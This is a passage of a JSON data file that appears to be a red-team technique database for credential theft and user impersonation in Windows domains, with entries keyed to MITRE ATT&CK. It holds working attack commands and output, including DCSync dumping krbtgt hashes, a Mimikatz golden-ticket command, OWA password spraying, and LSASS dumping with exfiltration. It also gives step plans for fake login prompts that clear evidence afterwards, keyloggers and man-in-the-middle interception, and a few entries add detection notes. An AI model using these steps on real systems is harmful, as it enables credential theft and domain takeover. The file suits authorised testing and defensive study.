                "description": "Develop a fake credential prompt application that mimics the appearance of a legitimate system login prompt.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "2316a9ea-edc4-45d1-b431-f295caf9c2a4",
                "name": "Deploy Credential Prompt",
                "description": "Distribute the fake credential prompt application to target users, ensuring it runs when the victim operates the system.",
                "requirements": {},
                "results": [
                    "DEPLOY:SUCCESS",
                    "PROCESS:FKE_PROMPT"
                ]
            },
            {
                "id": "aef3118e-cf43-4087-b3c5-09ec165b0fd4",
                "name": "Capture Credentials",
                "description": "Monitor the input fields of the fake credential prompt application to capture any user credentials entered.",
                "requirements": {},
                "results": [
                    "CRED:CAPTURED",
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "f4b5445b-d289-463b-a3ae-dc5feee3ff23",
                "name": "Log Events",
                "description": "Record authentication attempts and inputs to an external log for further analysis after user input is captured.",
                "requirements": {},
                "results": [
                    "LOG:EVENT_CAPTURED",
                    "LOG:INPUT_DATA"
                ]
            },
            {
                "id": "01d775e6-d8d6-4b43-a702-895c05028c68",
                "name": "Analyze Inputs",
                "description": "Process the logged data to extract any captured usernames and passwords for identification of compromised credentials.",
                "requirements": {},
                "results": [
                    "CRED:ANALYZED",
                    "CRED:USERNAME",
                    "CRED:PASS"
                ]
            },
            {
                "id": "5eac0f2e-ecd6-4d6a-8734-bc03f62e96b6",
                "name": "Remove Evidence",
                "description": "Clear any traces of the fake credential prompt application from the system and logs to minimize detection.",
                "requirements": {},
                "results": [
                    "EVIDENCE:CLEARED",
                    "LOG:REMOVED"
                ]
            }
        ]
    },
    {
        "id": "fd9a1c16-c972-424a-a1f0-6a4e96067a2f",
        "name": "Data Protection API (DPAPI)",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1555",
        "external": false,
        "description": "NoDescription",
        "content": "# DPAPI\n\nThe Data Protection API (DPAPI) is a component built into Windows that provides a means for encrypting and decrypting data \"blobs\". It uses crypto keys that are bound to either a specific user or computer account and allows Windows and external applications to protect or unprotect data.\n\nDPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and others like Google Chrome.\n\nThe credential manager blobs are stored in the user's `AppData` directory.\n>ls C:\\Users\\$env:username\\AppData\\Local\\Microsoft\\Credentials\n\nThe native `vaultcmd` tool can also be used to list them.\n>beacon> run vaultcmd /listcreds:\"Windows Credentials\" /all\n\nIf size not null some creds are saved\n>ls C:\\Users\\$env:username\\AppData\\Local\\Google\\Chrome\\User Data\\Default\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Mimikatz",
            "SharpChromium",
            "SharpDPAPI"
        ],
        "steps": [
            {
                "id": "f2bb2c8e-89a6-4a85-b733-8a5bd3807cde",
                "name": "List Credential Files",
                "description": "Retrieve a list of credential files stored in the Windows Credential Manager directory.",
                "requirements": {},
                "results": [
                    "CRED:FILE_LIST"
                ]
            },
            {
                "id": "501a10e7-6e0b-4556-b1e7-b58ecddd3c68",
                "name": "Use vaultcmd to List All Credentials",
                "description": "Execute the vaultcmd tool to list all credentials stored in the 'Windows Credentials' vault.",
                "requirements": {},
                "results": [
                    "CRED:LIST"
                ]
            },
            {
                "id": "9c22c48b-e62b-4bc6-b4d4-7e96ddf01bd0",
                "name": "List Google Chrome User Data",
                "description": "Check for user data files in the Google Chrome directory to find stored login credentials.",
                "requirements": {},
                "results": [
                    "CRED:CHROME_DATA"
                ]
            },
            {
                "id": "ec5a68e6-0bee-4113-9433-cf04406fda39",
                "name": "Extract Master Key",
                "description": "Use Mimikatz to extract the DPAPI master key associated with a specific SID.",
                "requirements": {},
                "results": [
                    "CRED:MASTER_KEY"
                ]
            },
            {
                "id": "7eb815ea-fc65-4117-b246-d8d2f36258cb",
                "name": "Decrypt Credential Blob",
                "description": "Decrypt credential blobs using Mimikatz by providing the path of the credential file and associated master key.",
                "requirements": {},
                "results": [
                    "CRED:DECRYPTED_CREDENTIAL"
                ]
            },
            {
                "id": "7fb9e9e6-1da6-448f-b74f-6338ec87769b",
                "name": "Dump Google Chrome Passwords",
                "description": "Execute SharpChromium to extract and display saved passwords from Google Chrome.",
                "requirements": {},
                "results": [
                    "CRED:CHROME_PASSWORDS"
                ]
            },
            {
                "id": "f3d13b6c-6af3-4888-8c59-735c49c45b8e",
                "name": "Dump DPAPI Private Keys",
                "description": "Use SharpDPAPI to dump private keys stored in the DPAPI for further analysis.",
                "requirements": {},
                "results": [
                    "CRED:PRIVATE_KEYS"
                ]
            }
        ]
    },
    {
        "id": "ad973bb9-b8aa-4b9f-a8be-899c610416d7",
        "name": "DCSync",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.006",
        "external": false,
        "description": "NoDescription",
        "content": "# DCSync\nDCSync is a technique which replicates the MS-DRSR protocol to replicate AD information, including password hashes. Under normal circumstances, this is only ever performed by (and between) Domain Controllers. There are specific DACLs relating to DCSync called **Replicating Directory Changes \\[All/In Filtered Set\\]**, which by default is only granted to Enterprise/Domain Admins and Domain Controllers.\n\nThese are set on the root domain object. Enterprise/Domain Admins can grant the Replicating Directory Change rights to other users, groups or computers.\n\n1. Assign an additional attacker controlled user DCsync rights. [[PowerView#Assign rights DCSync]]\n2. Perform a DCSync for the `EDU\\krbtgt` which can create a golden ticket for everyone.\n```beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> dcsync edu.evil.corp EDU\\krbtgt\n[DC] 'edu.evil.corp' will be the domain\n[DC] 'dc-2.edu.evil.corp' will be the DC server\n[DC] 'EDU\\krbtgt' will be the user account\n\n[...snip...]\n\n* Primary:Kerberos-Newer-Keys *\n Default Salt : EDU.EVIL.IO/krbtgt\n Default Iterations : 4096\n Credentials\n aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa\n aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822\n des_cbc_md5       (4096) : b9fefed6da865732\n```\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "9b249244-3a8a-49c9-8917-d115c2c50b06",
                "name": "Assign DCSync Rights to User",
                "description": "Using PowerView, assign DCSync rights to an attacker-controlled user to allow the user to replicate directory changes. This sets the necessary permissions in Active Directory for the specified user.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain Admin privileges"
                },
                "results": [
                    "DCSYNC:USER_GRANTED"
                ]
            },
            {
                "id": "80a23309-5da8-4b03-9dc0-b5a2c44ecddf",
                "name": "Perform DCSync to Retrieve Credentials",
                "description": "Execute the DCSync command to pull the password hashes for the specified account (e.g., EDU\\krbtgt) from the domain controller. This utilizes the privileges obtained in the previous step to funnel the data back to the attacker.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "User with DCSync rights"
                },
                "results": [
                    "CRED:HASH",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "10308992-7220-4fa9-8eea-ba7a2deaf61f",
        "name": "eKeys",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# eKeys\nSince most Windows services choose to use [[Kerberos]] over NTLM, leveraging these over NTLM hashes makes more sense for blending into normal authentication traffic.\n\nIf available, the **aes256_hmac** and **aes128_hmac** attributes are prefered and used via [[Overpass-the-Hash]].\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Mimikatz"
        ],
        "steps": [
            {
                "id": "b61801ee-b6b7-4ed3-bdc1-fa5ef353f511",
                "name": "Dump Kerberos Encryption Keys",
                "description": "Use Mimikatz to dump Kerberos encryption keys from the system, which can be used for authentication and impersonation purposes. This operation retrieves keys from memory for the currently logged-in user.",
                "requirements": {
                    "tool": "Mimikatz",
                    "access": "Administrator privileges on the target machine"
                },
                "results": [
                    "KERBEROS:KEYS",
                    "KERBEROS:USER",
                    "KERBEROS:DOMAIN"
                ]
            }
        ]
    },
    {
        "id": "3e2a5a7d-c1b0-42b3-98d0-17cb6941f9d1",
        "name": "Extract Kerberos Tickets",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558",
        "external": false,
        "description": "Extract kerberos ticket from memory",
        "content": "# Extract Kerberos Tickets\nIt is possible to extract all kerberos tickets via [[Rubeus#Extract Kerberos Tickets]] of\n* logged on users with admin rights\n* kerberos tickets of an user with user rights via \n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "f07d6c31-5d04-4c73-bc28-f845292d0584",
                "name": "Check for Active Kerberos Tickets",
                "description": "Use the 'klist' command to display the Kerberos tickets currently held by the user. This shows whether there are any valid tickets in memory.",
                "requirements": {},
                "results": [
                    "TICKET:VALID",
                    "TICKET:USERNAME"
                ]
            },
            {
                "id": "9e2e4a84-1117-4b9c-913b-3b03d1fdd7ae",
                "name": "Extract Kerberos Tickets with Rubeus",
                "description": "Run 'Rubeus.exe kerberoast' to extract all Kerberos tickets from the memory of the logged-in user. This will provide detailed outputs including usernames, ticket hashes, and more.",
                "requirements": {
                    "tool": "Rubeus",
                    "access": "Admin rights on the machine"
                },
                "results": [
                    "TICKET:HASH",
                    "TICKET:USERNAME"
                ]
            },
            {
                "id": "8c72b2cb-484b-4f9a-bdf1-63f231e964a4",
                "name": "Save Extracted Tickets",
                "description": "Use the 'Rubeus.exe dump' command to save extracted Kerberos tickets into a file for later analysis. This will create a .kirbi file containing the ticket information.",
                "requirements": {
                    "tool": "Rubeus",
                    "access": "Admin rights on the machine"
                },
                "results": [
                    "FILE:KIRBI",
                    "TICKET:SAVED"
                ]
            },
            {
                "id": "4b55e1b1-98c4-4c75-9442-c6e11cf90e1f",
                "name": "Analyze Extracted Tickets",
                "description": "Inspect the saved .kirbi file using tools such as 'kerberoast' or 'Mimikatz' to analyze the tickets for potential credential harvesting.",
                "requirements": {
                    "tool": "Mimikatz or Kerberoast"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "9e7744a0-ed8a-4ebb-a832-4d5f8cd94170",
        "name": "Forged Certificates",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1588.004",
        "external": false,
        "description": "NoDescription",
        "content": "# Forged Certificates\nThe AD CS roles can either be installed on separate servers or on domain controllers. \nForging certs can be used as\n* Privilege Escalation if accessible by non-domain admins\n* domain persistence method by creating (with priv key) certificates which can be used to request TGTs\n\nThe default validity period for a CA private key is 5 years, but can be set to any value during the setup.\n\nOnce on a CA, [[SharpDPAPI]] can extract the private keys.\n\n1. [[SharpDPAPI#Dump private keys]]\n2. Save the output to a `.pem` file and convert it to a `.pfx` with openssl on Kali, then move it back to the attacker machine.\n3. Build the forged certificate with [[ForgeCert#Generate certificate with stolen pk]].\n4. Use [[Rubeus#Ask TGT via certificate]] to request a legitimate TGT with this forged certificate and use it to access the domain controller.\n5. [[Use Kerberos ticket (kirbi)]]\n\nWe're not limited to forging user certificates, we can do the same for machines. Combine this with the [[S4U2self Abuse]] trick to gain access to any machine or service in the domain.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ForgeCert"
        ],
        "steps": [
            {
                "id": "4b181b44-ae1b-4abf-ba6d-b4f9201780f3",
                "name": "Dump Private Keys from CA",
                "description": "Use SharpDPAPI to extract the private keys from the Active Directory Certificate Services environment.",
                "requirements": {},
                "results": [
                    "KEY:EXTRACTED"
                ]
            },
            {
                "id": "7a94d0db-b0da-4f00-b0ae-3fdd51c937d9",
                "name": "Convert PEM to PFX",
                "description": "Convert the extracted private key from PEM format to PFX using OpenSSL on a Kali machine.",
                "requirements": {
                    "Kali Linux": {},
                    "OpenSSL": {}
                },
                "results": [
                    "CERT:CONVERTED",
                    "FILE:GOT fake.pfx"
                ]
            },
            {
                "id": "c24faebd-b536-4141-9ab1-4360193ffb9c",
                "name": "Generate Forged Certificate",
                "description": "Use ForgeCert to generate a forged certificate with the stolen private key. Specify the certificate subject and alternative name.",
                "requirements": {
                    "ForgeCert": {}
                },
                "results": [
                    "CERT:FORGED",
                    "CERT:SUBJECT:CN=User",
                    "CERT:ALTNAM:Administrator@evil.corp"
                ]
            },
            {
                "id": "b746c4b9-a681-4d15-b05d-4c54be2e8549",
                "name": "Request TGT with Forged Certificate",
                "description": "Utilize Rubeus to request a Ticket Granting Ticket (TGT) using the forged certificate.",
                "requirements": {
                    "Rubeus": {}
                },
                "results": [
                    "TGT:RECEIVED"
                ]
            },
            {
                "id": "92a74647-0b5f-4586-aedc-bcf7cd6164ae",
                "name": "Use TGT to Access Domain Controller",
                "description": "Use the obtained TGT to perform actions on the domain controller, gaining access to authorized resources.",
                "requirements": {},
                "results": [
                    "ACCESS:DOMAIN_CONTROLLER"
                ]
            }
        ]
    },
    {
        "id": "2292b5f8-33d3-41de-bb90-17bf0b9679bd",
        "name": "Golden Ticket",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558.001",
        "external": false,
        "description": "Extract kerberos ticket from memory",
        "content": "# Golden Tickets\nA Golden Ticket is a forged TGT. In comparison to a Silver Ticket, which impersonates a single service or a single machine, a Golden Ticket can be used to impersonate either a choosen user, service, or machine.\n\n* Create silver tickets: [[Mimikatz#Create silver ticket]]\n* Create golden tickets: [[Mimikatz#Create golden ticket]]\n\n## Detection\nNetwork:\n- Lifetime with mimikatz is abnormal 10 years\n\nWindows logs:\n- Seeing 4769's _without_ a prior 4768.\n  It's not possible to request a TGS without a TGT. No record of a TGT being issued -> forged offline.\n- Alert on 4769's for sensitive users such as the default domain administrator account.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n### Create golden ticket (user)\n#OPSEC Specify the lifetime (mimikatz does abnormal 10 years)\nUse the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).\n\n1. Get DC [[PowerView#Get-DomainController]] \n2. [[PowerView#Get-DomainSID]]\n3. [[DCSync]] the krbtgt user\n4. Generate [[Golden Ticket]] as follows:\nWhere:\n-   `/user` is the username to impersonate : see 2\n-   `/domain` is the current domain name : see 1\n-   `/sid` is the current domain SID. : see 2\n-   `/aes256` is the AES256 key for the krbtgt : see 3\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac\nLifetime  : 3/11/2022 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM\n-> Ticket : golden.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": [
            {
                "id": "b5c77a1d-e3f9-4639-97c2-8f87d2e47d48",
                "name": "Get Domain Controller",
                "description": "Query the Active Directory environment to obtain the current Domain Controller information.",
                "requirements": {},
                "results": [
                    "DC:LIST"
                ]
            },
            {
                "id": "2bf07876-a019-450e-878c-301fce31d17d",
                "name": "Get Domain SID",
                "description": "Extract the Security Identifier (SID) of the current domain to be used during ticket creation.",
                "requirements": {},
                "results": [
                    "DOMAIN_SID"
                ]
            },
            {
                "id": "e76d0e50-ff68-4933-8b6a-c7fa34fcf063",
                "name": "Extract KRBTGT User's NTLM Hash",
                "description": "Use the DCSync technique to retrieve the NTLM hash for the KRBTGT user account from Active Directory.",
                "requirements": {},
                "results": [
                    "KRBTGT:HASH"
                ]
            },
            {
                "id": "f1b3bd38-7dfc-4e1a-8fb1-6bc130241746",
                "name": "Create Golden Ticket",
                "description": "Execute Mimikatz to forge a Kerberos Golden Ticket using the specified user, domain, SID, and AES256 key.",
                "requirements": {
                    "Mimikatz": true
                },
                "results": [
                    "TICKET:GENERATED",
                    "TICKET:FILENAME"
                ]
            }
        ]
    },
    {
        "id": "9f70b922-eff9-4fdf-afd2-516d881f926a",
        "name": "Internal Phishing",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1566",
        "external": false,
        "description": "Internal phishing campagne",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Espoofer]]\n[[Phishing]]\nChecking for spoofable header",
            "\n## [[MailSniper]]\n[[Phishing]]\nGet internal domain names\n``````\nipmo C:\\Tools\\MailSniper\\MailSniper.ps1\nInvoke-DomainHarvestOWA -ExchHostname 10.10.15.100\n\n[*] Harvesting domain name from the server at 10.10.15.100\nThe domain appears to be: EDU or evil.corp\n``````\n\n Password spray\n``````\nInvoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2022\n\n[*] Now spraying the OWA portal at https://10.10.15.100/owa/\n[*] SUCCESS! User:EDU\\patrick Password:Summer2022\n[*] A total of 1 credentials were obtained.\n``````",
            "\n## [[spoofcheck]]\n[[Phishing]]\nSimple script that checks a domain for email protections."
        ],
        "tools": [
            "Espoofer",
            "MailSniper",
            "ruler",
            "spoofcheck"
        ],
        "steps": [
            {
                "id": "a4a7cbc2-a1bc-4e06-b8be-19ef7f5d7007",
                "name": "Check for Spoofable Headers",
                "description": "Use the Espoofer tool to identify email headers that can be spoofed.",
                "requirements": {},
                "results": [
                    "SPOOF:TRUE",
                    "SPOOF:FALSE"
                ]
            },
            {
                "id": "b53d279d-7af3-472b-9ba5-e35eeb196e64",
                "name": "Harvest Internal Domains",
                "description": "Execute the MailSniper script to retrieve internal domain names from the given Exchange server by specifying its hostname.",
                "requirements": {
                    "tool": "MailSniper",
                    "access": "Access to the Exchange server"
                },
                "results": [
                    "DOMAIN:EDU",
                    "DOMAIN:evil.corp"
                ]
            },
            {
                "id": "bc24e054-f5c5-4dd8-9cb3-e4b7bb0e29f3",
                "name": "Password Spray Against OWA",
                "description": "Perform a password spray attack against the OWA portal using a predefined user list and password. Monitor for any successful authentications.",
                "requirements": {
                    "tool": "MailSniper",
                    "access": "Access to the Exchange server"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "c8ee0729-cf9e-485c-8fc6-f0785b9d4848",
                "name": "Check Domain for Email Protections",
                "description": "Run the spoofcheck script against the target domain to evaluate its email protections.",
                "requirements": {
                    "tool": "spoofcheck",
                    "access": "Access to the domain"
                },
                "results": [
                    "PROTECTION:SPF",
                    "PROTECTION:DKIM",
                    "PROTECTION:DMARC"
                ]
            }
        ]
    },
    {
        "id": "2f75ecae-8b39-47ba-8a12-619404b8ea10",
        "name": "Keylogging",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1056.001",
        "external": false,
        "description": "Creating a fake credential prompt could lead to the recovery of plaintext credentials",
        "steps": [
            {
                "id": "c8e33b3d-b7e1-4f82-ba58-e149c235c1e1",
                "name": "Setup Keylogging Tool",
                "description": "Install a keylogging tool that can capture keystrokes on the target machine. Ensure the tool can run in the background and startup with the operating system.",
                "requirements": {},
                "results": [
                    "KEYLOG:INACTIVE"
                ]
            },
            {
                "id": "1d0e8bd3-c0c4-4ea4-98d0-81e1a36ae6eb",
                "name": "Configure Keylogging Parameters",
                "description": "Configure the keylogger to record keystrokes from specific applications (like web browsers or login forms) by setting the required hooks or monitoring parameters.",
                "requirements": {},
                "results": [
                    "KEYLOG:CONFIGURED"
                ]
            },
            {
                "id": "5646e2a5-68f3-4b3b-aadd-b4d9617749a4",
                "name": "Start Keylogging Session",
                "description": "Start the keylogging tool to begin capturing keystrokes. This can usually be done via a command line interface or a GUI of the keylogging tool.",
                "requirements": {},
                "results": [
                    "KEYLOG:ACTIVE"
                ]
            },
            {
                "id": "eef8dd98-1dc4-451b-9a55-e20cc60e6c4b",
                "name": "Capture Keystrokes",
                "description": "Run the target application (e.g., a web browser) and monitor the keylogger's output to capture any typed credentials or sensitive information.",
                "requirements": {},
                "results": [
                    "KEYLOG:PASS",
                    "KEYLOG:USERNAME"
                ]
            },
            {
                "id": "2c219c11-94c9-4cbb-b46e-fc6e9c1a7283",
                "name": "Save Keylogged Data",
                "description": "Save the captured keystrokes to a file or database for later retrieval and analysis. Ensure that the format is readable and securely stored.",
                "requirements": {},
                "results": [
                    "KEYLOG:DATA_SAVED"
                ]
            },
            {
                "id": "a638c153-7d02-4e59-a5c1-f23cc0f950cb",
                "name": "Analyze Captured Data",
                "description": "Review the saved keylogging data to extract any plaintext credentials or usernames. Look for patterns or specific entries that indicate credential submission.",
                "requirements": {},
                "results": [
                    "KEYLOG:REVIEW_SUCCESS"
                ]
            }
        ]
    },
    {
        "id": "5f16f80a-3a0b-4987-868a-4ec7ef59f789",
        "name": "LSA Secrets",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.004",
        "external": false,
        "description": "This technique involves accessing Local Security Authority (LSA) secrets, which can contain a variety of credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets and can also be dumped from memory.",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "c7b8678f-80dd-4a6b-8d3c-3a74a8d89eca",
                "name": "Check LSA Secrets in Registry",
                "description": "Access the Windows registry to enumerate LSA secrets stored at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. This is where sensitive credential information may be stored.",
                "requirements": {},
                "results": [
                    "LSA_SECRET:FOUND"
                ]
            },
            {
                "id": "5d6e93e5-c2d8-43be-839a-65c21fc60d38",
                "name": "Dump LSA Secrets from Memory",
                "description": "Use a memory analysis tool to extract LSA secrets directly from system memory, typically targeting the lsass.exe process to retrieve live secrets that may not be present in the registry.",
                "requirements": {
                    "tool": "Memory analysis tool (e.g., Process Explorer, Volatility)"
                },
                "results": [
                    "LSA_SECRET:DUMPED"
                ]
            },
            {
                "id": "4b02a09f-dbab-46eb-bf66-7d87c79af940",
                "name": "List Services Using LSA Secrets",
                "description": "Identify which services or applications are dependent on LSA secrets for authentication by checking the services using credentials stored in the secrets.",
                "requirements": {},
                "results": [
                    "LSA_SERVICE:IDENTIFIED"
                ]
            },
            {
                "id": "34f5359b-cf81-47ba-b0dd-51bc613e68a2",
                "name": "Monitor Security Event Logs",
                "description": "Monitor the Windows Security Event logs for occurrences of unauthorized access attempts to LSA secrets, focusing on Event ID 4672 (Special privileges assigned) and other related IDs.",
                "requirements": {},
                "results": [
                    "EVENT:UNAUTHORIZED_ACCESS"
                ]
            }
        ]
    },
    {
        "id": "aa055bc4-2f48-437d-bca5-ec1f82985f19",
        "name": "LSASS dumping",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.001",
        "external": false,
        "description": "NoDescription",
        "content": "# LogonPasswords\nThis feature retrieves NTLM hashes which can be used with [[Pass-the-Hash]] or cracking to recover the plain-text.\n\n#OPSEC A lot of tradecraft that leverages NTLM are undesirable.\n-   [[Pass-the-Hash]] requires patching LSASS.\n-   [[Overpass-the-Hash]] with NTLM uses a weaker encryption compared to what Windows uses by default.\n\n-> Better use [[eKeys]] to get the AES and [[Overpass-the-Hash]]\n\nOr just dump it via TASKMANAGER and exfiltrate it to then run mimikatz on it locally!",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Dumpert",
            "Handlekatz-BOF",
            "Handlekatz",
            "Mimikatz",
            "MiniDump",
            "physmem2profit"
        ],
        "steps": [
            {
                "id": "ebdbaf70-614c-4f6d-a11c-322066b8caf5",
                "name": "Dump LSASS Memory Using physicmem2profit",
                "description": "Run 'physmem2profit' on the target system to obtain a memory dump of the LSASS process. Ensure the signed Winpmem driver is present on the target host.",
                "requirements": {},
                "results": [
                    "DUMP:LSASS"
                ]
            },
            {
                "id": "c73b8bc8-73eb-4147-b7cc-dcaedd5740fa",
                "name": "Copy LSASS Dump to Attacker Machine",
                "description": "Transfer the generated LSASS memory dump file from the target machine to your attacking machine for further analysis with Mimikatz.",
                "requirements": {},
                "results": [
                    "FILE:LSASS_DUMP"
                ]
            },
            {
                "id": "b711a5c5-4a03-4c69-a14b-b8e6a84406f8",
                "name": "Extract Credentials with Mimikatz",
                "description": "Use 'mimikatz' with the command to extract logon passwords from the LSASS dump. You need to run 'mimikatz' on the machine where the dump is located.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "0bcb2f20-c0b9-404d-b4c7-2f365945b056",
                "name": "HandleKatz Process Dump",
                "description": "Use 'Handlekatz' to directly dump the credentials from a specific LSASS process ID. You need to specify the LSASS process ID and output file path.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "9c56e5f7-e56e-4183-91de-a94dc7a08841",
                "name": "Obtain NTLM Hashes",
                "description": "Utilize 'mimikatz' with the command to extract NTLM hashes, which can be used for pass-the-hash attacks. This retrieves valuable credential information from the LSASS process.",
                "requirements": {},
                "results": [
                    "HASH:NTLM"
                ]
            }
        ]
    },
    {
        "id": "00e83897-8668-4d5d-9888-8ff0d7c4acfe",
        "name": "Make Token",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Make Token\nThe Cobalt Strike command `make_token` uses the [LogonUserA](https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) to get a process handle with the users token. For that it requires the username, domain and plaintext password and the logon type **LOGON32_LOGON_NEW_CREDENTIALS**.\n\nFrom MS:\n> This logon type allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identifier but uses different credentials for other network connections.\n\nThe local identifier stays the same since it uses the own token!  \n* `getuid` stays  **EDU\\john**\n* network connections use new user token\n* no local admin privs are required\n* To revert the token, use `rev2self`.\n\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\nbeacon> ls \\\\srv2\\c$\n[-] could not open \\\\srv2\\c$\\*: 5\nbeacon> make_token EDU\\doe Passw0rd1\n[+] Impersonated EDU\\john\nbeacon> ls \\\\srv2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n\n## Detection\n* Event `4624: An account was successfully logged on` with Logon Type: `LOGON32_LOGON_NEW_CREDENTIALS` (type `9`).  \n>event.code: 4624 and winlog.event_data.LogonType: 9\n* Windows commands such as RunAs will also generate the same event.\n* Records contain the user who ran the command, the user they're impersonating, and the process it was run from.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "eeb4212c-4b79-451b-9eef-d4c95380d32c",
                "name": "Get Current User ID",
                "description": "Retrieve the current user ID to verify who is logged in before initiating a token impersonation.",
                "requirements": {},
                "results": [
                    "USER:EDU\\john"
                ]
            },
            {
                "id": "26190a27-f949-4d5c-a3e6-41be9b7e8cfd",
                "name": "Initiate Token Creation",
                "description": "Use the `make_token` command to create a new token with specified credentials (username, password, and domain). This allows the impersonation of another user for network connections without local admin privileges.",
                "requirements": {},
                "results": [
                    "IMPERSONATED:EDU\\doe"
                ]
            },
            {
                "id": "f98f5511-f2b5-4fb5-bc9f-2f3f60ea4f09",
                "name": "List Directory with New Token",
                "description": "Attempt to list the contents of a network directory to verify that the impersonated token has the necessary permissions.",
                "requirements": {},
                "results": [
                    "DIR_ACCESS:SUCCESS"
                ]
            },
            {
                "id": "21440b60-5457-468e-8045-302b6e27c415",
                "name": "Check Event Log for Logon Event",
                "description": "Examine the event logs for Event ID 4624 to determine if the impersonation and logon using new credentials was recorded successfully.",
                "requirements": {},
                "results": [
                    "EVENT:4624",
                    "LOGON_TYPE:9"
                ]
            }
        ]
    },
    {
        "id": "87ca2738-4ac8-4533-8d43-c897da75f590",
        "name": "MITM",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T0830",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Bettercap",
            "Ettercap",
            "sslstrip"
        ],
        "steps": [
            {
                "id": "4b3d54f0-a8cd-4bc0-8eed-58e1329fade6",
                "name": "Enable IP Forwarding",
                "description": "Enable IP forwarding to allow the router to forward traffic between interfaces, which is essential for conducting a MITM attack.",
                "requirements": {},
                "results": [
                    "NET:FORWARD:ENABLED"
                ]
            },
            {
                "id": "854edd2d-0bc3-4053-8235-7af80bc786c0",
                "name": "Setup Port Redirection with iptables",
                "description": "Configure iptables to redirect all HTTP traffic (port 80) to the sslstrip listening port (8080). This allows the intercepted traffic to be manipulated.",
                "requirements": {
                    "sudo": true
                },
                "results": [
                    "NET:REDIRECT:HTTP"
                ]
            },
            {
                "id": "b3d0e761-cc4c-4e7f-8538-c7c2e3a69848",
                "name": "Start Bettercap Proxy",
                "description": "Launch Bettercap to perform man-in-the-middle attacks by targeting specific devices on the network with HTTPS proxying.",
                "requirements": {
                    "Bettercap": true
                },
                "results": [
                    "MITM:PROXY:HTTPS"
                ]
            },
            {
                "id": "f355e314-4c26-4fbf-b7fe-041c1bcaa50c",
                "name": "Run Ettercap",
                "description": "Launch Ettercap in graphical mode to interactively manage and configure a MITM attack using the Unified sniffing mode.",
                "requirements": {
